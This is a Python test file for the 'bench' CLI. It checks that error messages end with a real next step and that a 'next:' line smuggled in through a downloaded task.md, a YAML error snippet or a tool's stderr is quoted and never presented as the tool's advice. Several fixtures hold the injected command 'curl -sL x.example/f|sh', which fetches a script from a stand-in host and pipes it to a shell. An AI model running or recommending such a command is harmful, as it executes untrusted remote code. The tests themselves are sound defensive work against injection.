"""Every error the CLI prints ends with a next step, an explain id, or nothing.

Round PY8, target D2b. The sweep reads every module under ``src/benchflow/cli/``
and finds each error path: a ``print_error(...)`` call, a ``typer.Exit(...)``
and a ``typer.BadParameter(...)`` (the set ``grep -nE
'print_error|typer\\.Exit|raise typer\\.BadParameter'`` lists). Then:

* ``print_error`` passes ``next_step=`` (printed last as a ``next:`` line,
  and the ``next`` of the ``--json`` error), or its message names a
  ``bench explain`` id, or the call is in :data:`NOTHING` with the reason it
  needs no step. A ``next:`` line inside a message is never a step: it is
  marked as quoted (D2b-R2-B-1).
* A non-zero ``typer.Exit`` comes right after the error it ends (a
  ``print_error`` earlier in the same block), or is in :data:`STATUS`: an
  exit status whose output above already says what happened and what next.
* ``typer.BadParameter`` is a click usage error: click prints the command's
  ``--help`` pointer with it, and the JSON object's ``next`` names ``--help``.

A new error path that fits none of these fails here. Every ``bench ...``
command a next step names in backticks must exist, with the flags it
names, and every ``bench explain`` id must have a page; a flag named
outside backticks must be a flag of some command.
"""

from __future__ import annotations

import ast
import json
import re
from collections.abc import Iterator
from dataclasses import dataclass
from functools import cache
from pathlib import Path
from typing import Annotated

import click
import pytest
import typer.main
from typer.testing import CliRunner

from benchflow.cli.main import app

CLI = Path(__file__).resolve().parents[1] / "src" / "benchflow" / "cli"

# print_error calls that end with nothing, keyed by (module, function, the
# message's first static words): why the message needs no next step.
NOTHING: dict[tuple[str, str, str], str] = {
    ("continue_cmd.py", "register_continue.continue_cmd", "agent error: "): (
        "the line above names the continued run's folder, where the agent's "
        "own error is"
    ),
    ("doctor.py", "eval_preflight", "No job was created. "): (
        "check_agent_names' message ends with its own step, `bench agent "
        "list` (test_an_unknown_agent_ends_with_its_step)"
    ),
    ("traj.py", "_resolve_workspace_dir", "not a folder: "): (
        "an interactive prompt: it asks again right after"
    ),
    ("traj.py", "_prompt_for_path", "path not found: "): (
        "an interactive prompt: it asks again right after"
    ),
    ("traj.py", "_prompt_valid", ""): (
        "an interactive prompt: it asks again right after"
    ),
}

# Non-zero exits that follow no error message, keyed by (module, function,
# the exit code's source): what the output above them already says.
# `bench cache` exits with what run_cache returns.
RUN_CACHE_ROOT = (
    "run_cache(cleaning=False, remove=False, only=only, sandbox=sandbox, "
    "older_than=older_than, json_out=json_out)"
)
STATUS: dict[tuple[str, str, str], str] = {
    ("main.py", "_finish_run", "exit_code"): (
        "the end-of-run summary names each cause with its `bench explain` id, "
        "and each gate that failed"
    ),
    ("main.py", "eval_view", "3"): (
        "--confirm's documented 'rejected' exit; the viewer showed the decision"
    ),
    ("_shared.py", "_exit_if_evaluation_had_errors", "1"): (
        "after the run report, which names each cause with its explain id"
    ),
    ("branch.py", "register_eval_branch.eval_branch", "1"): (
        "after the per-child lines, each child's error, and `Next: bench eval "
        "view <job>`"
    ),
    ("continue_cmd.py", "register_continue.continue_batch_cmd", "1"): (
        "after the batch summary JSON, which names each failed folder"
    ),
    ("doctor.py", "register_doctor.doctor", "1 if failed else 0"): (
        "--json: the report's checks carry their fixes"
    ),
    ("doctor.py", "register_doctor.doctor", "1"): (
        "after the report and 'Fix the failed checks above, then run bench "
        "doctor again'"
    ),
    ("eval_regrade.py", "eval_regrade", "1"): (
        "after the regrade table, which names each failed trial's reason"
    ),
    ("embodied.py", "register_embodied.embodied_verify", "1"): (
        "after the verify report, which names each failed check and counts the "
        "trials by status"
    ),
    ("monitor.py", "_monitor_not_implemented", "2"): (
        "after 'not implemented yet' and the issue to follow"
    ),
    ("review.py", "_review_command", "1"): (
        "after each trial's error and the report's path"
    ),
    ("sandbox.py", "sandbox_cleanup", "1"): (
        "each failed backend printed its error and next step where it failed"
    ),
    ("skills.py", "register_skills.skills_validate", "1"): (
        "after the report, which lists each blocking finding"
    ),
    ("tasks.py", "register_tasks.tasks_check", "1"): (
        "after the checker's report, which lists each issue"
    ),
    # check_one (46d7305b5, merged beside this sweep) checks one task of the
    # folder tasks_check walks; tasks_check catches its exit and goes on.
    ("tasks.py", "register_tasks.check_one", "1"): (
        "after that task's report: the task.md field report, the separate "
        "verifier's refusal lines, or the red cross and each issue"
    ),
    ("cache.py", "register_cache.cache_root", RUN_CACHE_ROOT): (
        "run_cache printed its error and next step (a usage problem), or the "
        "notes and `next: bench doctor` (a backend it could not list)"
    ),
}


@dataclass(frozen=True)
class Site:
    module: str
    function: str
    kind: str  # print_error | exit | bad_parameter
    line: int
    call: ast.Call
    statement: ast.stmt
    block: tuple[ast.stmt, ...]

    def where(self) -> str:
        return f"{self.module}:{self.line} ({self.function})"


def _called(call: ast.Call) -> str:
    func = call.func
    if isinstance(func, ast.Name):
        return func.id
    if isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name):
        return f"{func.value.id}.{func.attr}"
    return ""


_KINDS = {
    "print_error": "print_error",
    "typer.Exit": "exit",
    "typer.BadParameter": "bad_parameter",
}


def _walk(
    module: str,
    body: list[ast.stmt],
    function: str,
) -> Iterator[Site]:
    for statement in body:
        yield from _walk_statement(module, statement, function, tuple(body))


def _walk_statement(
    module: str, statement: ast.stmt, function: str, block: tuple[ast.stmt, ...]
) -> Iterator[Site]:
    if isinstance(statement, ast.FunctionDef | ast.AsyncFunctionDef):
        name = f"{function}.{statement.name}" if function else statement.name
        yield from _walk(module, statement.body, name)
        return
    if isinstance(statement, ast.ClassDef):
        yield from _walk(module, statement.body, function)
        return
    # The statement's own expressions (not its nested blocks).
    nested: list[list[ast.stmt]] = []
    for field, value in ast.iter_fields(statement):
        if field in ("body", "orelse", "finalbody") and isinstance(value, list):
            nested.append(value)
        elif field == "handlers":
            nested.extend(handler.body for handler in value)
        elif field == "cases":
            nested.extend(case.body for case in value)
        else:
            for node in value if isinstance(value, list) else [value]:
                if not isinstance(node, ast.AST):
                    continue
                for sub in ast.walk(node):
                    if isinstance(sub, ast.Call) and _called(sub) in _KINDS:
                        yield Site(
                            module,
                            function,
                            _KINDS[_called(sub)],
                            sub.lineno,
                            sub,
                            statement,
                            block,
                        )
    for inner in nested:
        yield from _walk(module, inner, function)


@cache
def _sites() -> tuple[Site, ...]:
    found: list[Site] = []
    for path in sorted(CLI.glob("*.py")):
        tree = ast.parse(path.read_text(encoding="utf-8"))
        found.extend(_walk(path.name, tree.body, ""))
    return tuple(found)


@cache
def _module_strings(module: str) -> dict[str, str]:
    """Module-level ``NAME = "..."`` string constants of a cli module."""
    tree = ast.parse((CLI / module).read_text(encoding="utf-8"))
    out: dict[str, str] = {}
    for node in tree.body:
        if (
            isinstance(node, ast.Assign)
            and len(node.targets) == 1
            and isinstance(node.targets[0], ast.Name)
        ):
            text = _static(node.value, module, names=False)
            if text:
                out[node.targets[0].id] = text
    return out


def _static(node: ast.AST | None, module: str, *, names: bool = True) -> str:
    """The text a message or step expression holds that the source fixes.

    ``names`` reads a module-level string constant a name stands for.
    """
    if node is None:
        return ""
    if isinstance(node, ast.Constant):
        return node.value if isinstance(node.value, str) else ""
    if isinstance(node, ast.JoinedStr):
        return "".join(
            part.value
            if isinstance(part, ast.Constant) and isinstance(part.value, str)
            else " "
            for part in node.values
        )
    if isinstance(node, ast.BinOp):
        return _static(node.left, module, names=names) + _static(
            node.right, module, names=names
        )
    if isinstance(node, ast.BoolOp):
        # ``hint or RUN_FAILED_NEXT``: the fallback is the step the source fixes.
        return " ".join(_static(value, module, names=names) for value in node.values)
    if isinstance(node, ast.Name):
        if not names:
            return ""
        known = {**_module_strings("_shared.py"), **_module_strings(module)}
        return known.get(node.id, "")
    if (
        isinstance(node, ast.Call)
        and isinstance(node.func, ast.Attribute)
        and node.func.attr == "format"
    ):
        return _static(node.func.value, module)
    return ""


def _next_step(site: Site) -> ast.expr | None:
    for keyword in site.call.keywords:
        if keyword.arg == "next_step":
            return keyword.value
    return None


def _message(site: Site) -> ast.expr | None:
    return site.call.args[0] if site.call.args else None


def _is_nothing(value: ast.expr | None) -> bool:
    return isinstance(value, ast.Constant) and not value.value


def _nothing_key(site: Site) -> tuple[str, str, str]:
    text = _static(_message(site), site.module)
    for key in NOTHING:
        if key[:2] == (site.module, site.function) and text.startswith(key[2]):
            return key
    return (site.module, site.function, text[:40])


def test_the_sweep_finds_every_grepped_error_path():
    """The AST sweep sees each call the grep lists, and no fewer."""
    grepped = 0
    pattern = re.compile(r"print_error\(|typer\.Exit\(|typer\.BadParameter\(")
    for path in sorted(CLI.glob("*.py")):
        for line in path.read_text(encoding="utf-8").splitlines():
            if line.lstrip().startswith(("def ", "#")):
                continue
            grepped += len(pattern.findall(line))
    assert len(_sites()) == grepped
    assert sum(s.kind == "bad_parameter" for s in _sites()) == 2


def test_every_print_error_ends_with_a_next_step_an_explain_id_or_nothing():
    missing = []
    used: set[tuple[str, str, str]] = set()
    for site in _sites():
        if site.kind != "print_error":
            continue
        step = _next_step(site)
        if step is not None and not _is_nothing(step):
            continue
        text = _static(_message(site), site.module)
        if "bench explain" in text:
            continue
        key = _nothing_key(site)
        if key in NOTHING:
            used.add(key)
            continue
        missing.append(f"{site.where()}: {text[:60]!r}")
    assert not missing, "an error with no next step:\n" + "\n".join(missing)
    assert used == set(NOTHING), f"stale NOTHING entries: {set(NOTHING) - used}"


def _prints_an_error(statement: ast.stmt) -> bool:
    return any(
        isinstance(node, ast.Call) and _called(node) == "print_error"
        for node in ast.walk(statement)
    )


def test_every_failing_exit_follows_its_error_or_is_a_status():
    bare = []
    used: set[tuple[str, str, str]] = set()
    for site in _sites():
        if site.kind != "exit":
            continue
        code = site.call.args[0] if site.call.args else None
        if code is None or (isinstance(code, ast.Constant) and code.value == 0):
            continue  # success
        before = site.block[: site.block.index(site.statement)]
        if any(_prints_an_error(statement) for statement in before):
            continue
        key = (site.module, site.function, ast.unparse(code))
        if key in STATUS:
            used.add(key)
            continue
        bare.append(f"{site.where()}: typer.Exit({ast.unparse(code)})")
    assert not bare, "an exit with no error before it:\n" + "\n".join(bare)
    assert used == set(STATUS), f"stale STATUS entries: {set(STATUS) - used}"


def test_no_error_is_printed_in_red_on_the_way_out():
    """Errors go through print_error: stderr, escaped, and the --json object.

    A ``console.print("[red]...")`` or ``typer.secho(..., fg=RED)`` before an
    exit printed to stdout and left ``--json`` with a generic object. A
    status exit's report (``bench tasks check``'s red cross) is not an error.
    """
    red = []
    for site in _sites():
        if site.kind != "exit" or not site.call.args:
            continue
        if (site.module, site.function, ast.unparse(site.call.args[0])) in STATUS:
            continue
        index = site.block.index(site.statement)
        for statement in site.block[:index]:
            for node in ast.walk(statement):
                if not isinstance(node, ast.Call):
                    continue
                name = _called(node)
                text = _static(node.args[0] if node.args else None, site.module)
                colours = [ast.unparse(k.value) for k in node.keywords]
                if (name.endswith("console.print") and text.startswith("[red]")) or (
                    name == "typer.secho" and "typer.colors.RED" in colours
                ):
                    red.append(f"{site.module}:{node.lineno}")
    assert not red, red


def _all_commands() -> Iterator[tuple[tuple[str, ...], click.Command]]:
    def visit(path: tuple[str, ...], command: click.Command):
        yield path, command
        children = getattr(command, "commands", None)
        if children:
            for name in list(children):
                yield from visit((*path, name), children[name])

    yield from visit((), typer.main.get_command(app))


@cache
def _every_flag() -> frozenset[str]:
    return frozenset(
        opt
        for _, command in _all_commands()
        for param in command.params
        for opt in getattr(param, "opts", [])
        if opt.startswith("--")
    )


def _command(words: list[str]) -> tuple[click.Command, list[str]]:
    """The command ``bench <words>`` names, and the words after it."""
    command: click.Command = typer.main.get_command(app)
    rest = list(words)
    while rest:
        children = getattr(command, "commands", None)
        if not children or rest[0] not in children:
            break
        command = children[rest.pop(0)]
    return command, rest


def _steps() -> Iterator[tuple[Site, str]]:
    for site in _sites():
        if site.kind != "print_error":
            continue
        text = (
            _static(_next_step(site), site.module)
            + " "
            + _static(_message(site), site.module)
        )
        if text.strip():
            yield site, text


_FLAG = re.compile(r"(?<![\w-])--[a-z][a-z0-9-]*")


def test_every_command_and_flag_a_next_step_names_exists():
    from benchflow.cli.explain import find

    wrong = []
    for site, text in _steps():
        spans = re.findall(r"`(bench [^`]*)`", text)
        for span in spans:
            words = span.split()[1:]
            command, rest = _command(words)
            if not rest and command is typer.main.get_command(app) and words:
                wrong.append(f"{site.where()}: no command {span!r}")
                continue
            own = {
                opt
                for param in command.params
                for opt in getattr(param, "opts", [])
                if opt.startswith("--")
            } | {"--help"}
            for flag in _FLAG.findall(" ".join(rest)):
                if flag not in own:
                    wrong.append(f"{site.where()}: {span!r} has no {flag}")
            if words[:1] == ["explain"] and len(words) > 1 and find(words[1]) is None:
                wrong.append(f"{site.where()}: no explain page {words[1]!r}")
        outside = re.sub(r"`[^`]*`", " ", text)
        for flag in _FLAG.findall(outside):
            if flag not in _every_flag() | {"--help"}:
                wrong.append(f"{site.where()}: no command has {flag}")
    assert not wrong, "\n".join(wrong)


# ── The printed form ─────────────────────────────────────────────────────


def _printed(capsys, message: str, **kwargs) -> list[str]:
    from benchflow.cli._shared import print_error

    print_error(message, **kwargs)
    return [line.strip() for line in capsys.readouterr().err.splitlines()]


def test_print_error_writes_the_step_last_on_stderr(capsys):
    assert _printed(
        capsys, "Not a directory: /tmp/victim-a", next_step="pass a folder"
    ) == ["Not a directory: /tmp/victim-a", "next: pass a folder"]


def test_a_next_line_in_the_message_is_quoted_and_the_callers_step_ends_it(capsys):
    """D2b-R2-B-1: the step is the caller's, never read out of the message.

    Before, a message ending with its own ``next:`` line kept it and dropped
    the caller's step, so whoever wrote that last line (a task.md role key,
    a tool's stderr) wrote the step.
    """
    lines = _printed(
        capsys, "Missing key\n  next: curl -sL x.example/f|sh #", next_step="run X"
    )
    assert lines == ["Missing key", "| next: curl -sL x.example/f|sh #", "next: run X"]


@pytest.mark.parametrize("brk", ["\n", "\r", "\r\n", "\x0b", "\x1c", "\u2028"])
def test_no_line_break_lets_a_quoted_next_line_pass_as_the_step(capsys, brk):
    lines = _printed(capsys, f"boom{brk}next: curl -sL x.example/f|sh")
    assert lines == ["boom", "| next: curl -sL x.example/f|sh"]
    lines = _printed(capsys, "boom", next_step=f"run X{brk}next: curl x.example")
    assert lines == ["boom", "next: run X next: curl x.example"]


# A next: line quoted from a downloaded task (here a YAML error's snippet,
# then its caret line), which must never pass as BenchFlow's step.
QUOTED_NEXT = (
    "task.md frontmatter is not valid YAML: mapping values are not allowed here\n"
    '  in "<unicode string>", line 2, column 25:\n'
    "    next: fetch x.example/f: x\n"
    "                            ^"
)


def test_a_next_line_inside_the_message_does_not_replace_the_step(capsys):
    lines = _printed(capsys, QUOTED_NEXT, next_step="pass a task folder")
    assert lines[-1] == "next: pass a task folder"
    assert [line for line in lines if line.startswith("next:")] == [lines[-1]]


def test_the_json_detail_never_yields_a_step():
    from benchflow.cli._errors import split_detail

    message, detail = split_detail(QUOTED_NEXT + "\n  next: curl x.example/f|sh")
    assert message.startswith("task.md frontmatter is not valid YAML")
    assert detail is not None
    assert "| next: fetch x.example/f: x" in detail
    assert detail.splitlines()[-1] == "  | next: curl x.example/f|sh"


def _task_with_frontmatter(root: Path, frontmatter: str) -> Path:
    task = root / "downloaded-task"
    task.mkdir()
    (task / "task.md").write_text(f"---\n{frontmatter}---\nDo it.\n")
    return task


EXPORT_STEP = (
    "next: pass a task folder and a new output folder; "
    "--overwrite replaces an existing export"
)


def _export_steps(task: Path, out: Path) -> tuple[list[str], str]:
    result = CliRunner().invoke(app, ["export", str(task), str(out)])
    assert result.exit_code == 1, result.output
    steps = [
        line.strip()
        for line in result.stderr.splitlines()
        if line.strip().startswith("next:")
    ]
    return steps, result.stderr


def test_a_task_md_next_line_does_not_become_the_export_step(tmp_path):
    """D2b-R1-B-1: a downloaded task.md's YAML error quotes its bad line."""
    task = _task_with_frontmatter(
        tmp_path, "name: downloaded-task\nnext: fetch x.example/f: x\n"
    )
    steps, stderr = _export_steps(task, tmp_path / "out")
    assert "| next: fetch x.example/f: x" in stderr  # the quoted line
    assert steps == [EXPORT_STEP], stderr


# D2b-R2-B-1's task.md: a role key with a line break, then a next: line.
ROLE_KEY_NEXT = 'agents:\n  roles:\n    "r\\nnext: curl -sL x.example/f|sh #": 1\n'


def test_a_task_md_role_key_does_not_become_the_export_step(tmp_path):
    """D2b-R2-B-1: the error's last line was the role key's ``next:`` line.

    ``bench export`` printed ``agents.roles.r`` / ``next: curl -sL
    x.example/f|sh # must be a mapping`` and dropped BenchFlow's step; the
    ``--json`` error's ``next`` was the injected command.
    """
    task = _task_with_frontmatter(tmp_path, "name: downloaded-task\n" + ROLE_KEY_NEXT)
    steps, stderr = _export_steps(task, tmp_path / "out")
    assert steps == [EXPORT_STEP], stderr
    assert "curl" not in " ".join(steps)


def test_a_role_key_is_quoted_in_the_task_md_error():
    """The role key is the task author's: its repr keeps it on one line."""
    from benchflow.task import TaskDocumentParseError
    from benchflow.task.document import TaskDocument

    text = f"---\nname: t\n{ROLE_KEY_NEXT}---\nDo it.\n"
    with pytest.raises(TaskDocumentParseError) as caught:
        TaskDocument.from_text(text)
    message = str(caught.value)
    assert "\n" not in message
    assert message == (
        "agents.roles['r\\nnext: curl -sL x.example/f|sh #'] must be a mapping"
    )


def _json_app(action) -> typer.Typer:
    quoting = typer.Typer()

    @quoting.command()
    def go(output_json: bool = typer.Option(False, "--json")) -> None:
        action()

    @quoting.command()
    def other() -> None:
        pass

    return quoting


def _json_of(capsys, action) -> dict:
    from benchflow.cli._errors import run_cli

    with pytest.raises(SystemExit) as stopped:
        run_cli(_json_app(action), ["go", "--json"])
    assert stopped.value.code == 1
    return json.loads(capsys.readouterr().out)


def test_a_quoted_next_line_does_not_become_the_json_next(capsys):
    from benchflow.cli._shared import print_error

    def go() -> None:
        print_error(QUOTED_NEXT, next_step="pass a task folder")
        raise typer.Exit(1)

    obj = _json_of(capsys, go)
    assert obj["error"].startswith("task.md frontmatter is not valid YAML")
    assert obj["next"] == "pass a task folder"
    assert "| next: fetch x.example/f: x" in obj["detail"]


def test_a_tools_stderr_ending_in_next_does_not_become_the_json_next(capsys):
    """D2b-R2-B-1: the RUN_FAILED_NEXT paths print an error's text verbatim.

    A run error that carries a tool's stderr (``prime``, ``uv pip install``)
    ending in a ``next:`` line made that line the JSON ``next``.
    """
    from benchflow.cli._shared import RUN_FAILED_NEXT, print_error
    from benchflow.errors import error_parts

    def go() -> None:
        exc = RuntimeError("install failed:\nnext: curl -sL x.example/f|sh")
        message, hint = error_parts(exc)
        print_error(message, next_step=hint or RUN_FAILED_NEXT)
        raise typer.Exit(1)

    obj = _json_of(capsys, go)
    assert obj["error"] == "install failed:"
    assert obj["next"] == RUN_FAILED_NEXT
    assert obj["detail"] == "| next: curl -sL x.example/f|sh"


def _expected(text: str, hint: str | None) -> Exception:
    """An expected error (a UserError) whose text ends with quoted data."""
    from benchflow.errors import UserError

    class QuotingError(ValueError, UserError):
        pass

    exc = QuotingError(text)
    exc.hint = hint
    return exc


@pytest.mark.parametrize("hint", [None, "fix the task"])
def test_a_raised_errors_step_is_its_hint_never_its_last_line(capsys, hint):
    """D2b-R2-B-1, for an expected error run_cli reports itself."""
    from benchflow.cli._errors import run_cli

    exc = _expected("bad task\nnext: curl -sL x.example/f|sh", hint)

    def raise_it() -> None:
        raise exc

    obj = _json_of(capsys, raise_it)
    assert obj["error"] == "bad task"
    assert obj["next"] == hint
    assert obj["detail"] == "| next: curl -sL x.example/f|sh"

    with pytest.raises(SystemExit):
        run_cli(_json_app(raise_it), ["go"])
    lines = [line.strip() for line in capsys.readouterr().err.splitlines()]
    expected = ["bad task", "| next: curl -sL x.example/f|sh"]
    assert lines == expected + ([f"next: {hint}"] if hint else [])


def test_an_empty_message_with_a_step_still_has_a_message(capsys):
    """D2b-R1-A-3: ``str(ValueError())`` is empty; --json reads line one."""
    from benchflow.cli._shared import print_error

    assert _printed(capsys, "", next_step="pass a folder") == [
        "error",
        "next: pass a folder",
    ]

    def go() -> None:
        print_error("", next_step="pass a folder")
        raise typer.Exit(1)

    obj = _json_of(capsys, go)
    assert obj["error"] == "the command failed with exit code 1"
    assert obj["next"] == "pass a folder"


def test_no_step_leaves_the_message_alone(capsys):
    assert _printed(capsys, "done", next_step=None) == ["done"]


def test_a_command_error_ends_with_its_next_step(tmp_path):
    missing = tmp_path / "no-such-jobs"
    result = CliRunner().invoke(app, ["eval", "metrics", str(missing)])
    assert result.exit_code == 2
    lines = result.stderr.rstrip().splitlines()
    assert lines[0].startswith("Not a directory: ")
    assert lines[-1].strip().startswith("next: pass a job folder")


def test_the_json_error_carries_the_next_step(tmp_path, capsys):
    from benchflow.cli._errors import run_cli

    missing = tmp_path / "no-such-jobs"
    with pytest.raises(SystemExit) as stopped:
        run_cli(app, ["eval", "metrics", str(missing), "--json"])
    assert stopped.value.code == 2
    obj = json.loads(capsys.readouterr().out)
    assert obj["error"] == f"Not a directory: {missing}"
    assert obj["next"].startswith("pass a job folder or a folder of jobs")


def test_an_error_printed_in_red_before_now_goes_to_stderr_with_a_step(tmp_path):
    """``bench eval list <file>`` printed its error on stdout, with no step."""
    not_a_folder = tmp_path / "jobs.txt"
    not_a_folder.write_text("")
    result = CliRunner().invoke(app, ["eval", "list", str(not_a_folder)])
    assert result.exit_code == 2
    assert "Not a directory" not in result.stdout
    assert "Not a directory" in result.stderr
    assert "next: pass a job folder" in result.stderr


def test_an_unknown_agent_ends_with_its_step(capsys):
    """The NOTHING entry whose step is the library's own last sentence."""
    from benchflow.cli.doctor import eval_preflight

    with pytest.raises(typer.Exit):
        eval_preflight(sandbox="docker", agent="claude-agent-acq", model=None)
    err = " ".join(capsys.readouterr().err.split())
    assert err.startswith("No job was created. Unknown agent 'claude-agent-acq'")
    assert err.endswith("`bench agents` shows the registered agents.")


def test_a_bad_parameter_points_at_help(tmp_path):
    result = CliRunner().invoke(
        app,
        [
            "eval",
            "score",
            str(tmp_path),
            "--tasks-root",
            str(tmp_path),
            "--reviewer-idle-timeout",
            "soon",
        ],
    )
    assert result.exit_code == 2
    assert "--help" in result.output
    assert "expected whole seconds" in " ".join(result.output.split())


def _file_error_app() -> typer.Typer:
    plain = typer.Typer()

    @plain.command()
    def go(json_out: Annotated[bool, typer.Option("--json")] = False) -> None:
        raise FileNotFoundError(2, "No such file or directory", "/tmp/victim-a")

    return plain


def test_a_missing_file_ends_with_a_next_step(capsys):
    """A file error that reaches run_cli: its message, then what to check."""
    from benchflow.cli._errors import run_cli

    with pytest.raises(SystemExit) as stopped:
        run_cli(_file_error_app(), [])
    assert stopped.value.code == 1
    lines = [line.strip() for line in capsys.readouterr().err.splitlines()]
    assert lines == [
        "No such file or directory: /tmp/victim-a",
        "next: check the path, and that you can read it",
    ]


def test_a_missing_file_json_error_names_the_step(capsys):
    from benchflow.cli._errors import run_cli

    with pytest.raises(SystemExit):
        run_cli(_file_error_app(), ["--json"])
    obj = json.loads(capsys.readouterr().out)
    assert obj["error"] == "No such file or directory: /tmp/victim-a"
    assert obj["next"] == "check the path, and that you can read it"
